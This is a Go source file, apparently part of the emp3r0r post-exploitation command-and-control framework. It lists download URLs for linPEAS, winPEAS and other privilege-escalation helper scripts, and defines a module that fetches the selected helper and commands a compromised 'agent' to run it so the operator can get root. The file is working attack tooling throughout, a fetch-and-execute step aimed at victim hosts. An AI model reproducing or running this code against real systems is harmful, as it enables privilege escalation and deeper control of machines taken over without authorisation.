package cc

import (
	"fmt"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// LPEHelperURLs scripts that help you get root
var LPEHelperURLs = map[string]string{
	"lpe_les":         "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
	"lpe_lse":         "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	"lpe_linpeas":     "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
	"lpe_winpeas.ps1": "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1",
	"lpe_winpeas.bat": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
	"lpe_winpeas.exe": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe",
}

func moduleLPE() {
	go func() {
		// target
		target := ActiveAgent
		if target == nil {
			LogError("Target not exist")
			return
		}
		helperOpt, ok := AvailableModuleOptions["lpe_helper"]
		if !ok {
			LogError("Option 'lpe_helper' not found")
			return
		}
		helperName := helperOpt.Val

		// download third-party LPE helper
		LogInfo("Updating local LPE helper...")
		err := DownloadFile(LPEHelperURLs[helperName], Temp+tun.WWW+helperName)
		if err != nil {
			LogError("Failed to download %s: %v", helperName, err)
			return
		}

		// exec
		LogMsg("This can take some time, please be patient")
		cmd := fmt.Sprintf("%s --script_name %s", emp3r0r_def.C2CmdLPE, helperName)
		LogInfo("Running %s", cmd)
		err = SendCmd(cmd, "", target)
		if err != nil {
			LogError("Run %s: %v", cmd, err)
		}
	}()
}
